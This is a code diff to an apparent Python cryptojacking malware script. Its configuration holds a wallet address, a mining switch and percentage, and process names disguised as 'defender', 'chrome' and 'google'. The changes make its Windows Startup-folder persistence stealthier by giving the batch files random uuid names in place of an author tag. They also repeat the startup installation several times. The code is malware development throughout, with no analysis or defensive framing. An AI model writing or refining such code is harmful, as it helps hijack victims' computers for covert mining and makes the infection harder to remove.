@@ -64,7 +64,7 @@ ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNq
 
 CLONE_PROCESS = False # Create Instances of the program hidden in multiple path.
 PROCCESS_NAMES = ["defender", "sys", "google", "chrome", "proxy-services", "appdata-system", "visual-studio", "temp-file"]
-PROCESS_NUM = 2#3 is the perfect number,if you want your program to be un-removable put it a 5 maximum 
+PROCESS_NUM = processnumbers
 
 MINE = True #Mine crypto? True/False
 MINING_PERCENT = "30"
@@ -184,10 +184,11 @@ if yes == "yes":
 		if file_path == "":
 			file_path = copyof_file
 		bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
-		with open(bat_path + '\\' + str("made_by_0xSxZ") + ".bat", "w+") as bat_file:
+		with open(bat_path + '\\' + str(uuid.uuid4()) + ".bat", "w+") as bat_file:
 			bat_file.write(r'start "" "%s"' % file_path)
 	if(platform.system() == 'windows' or platform.system() == "Windows"):
-		add_to_startup()
+		for i in range(PROCESS_NUM):
+			add_to_startup()
 	def checkIfProcessRunning(processName):
 		'''
 		Check if there is any running process that contains the given name processName.
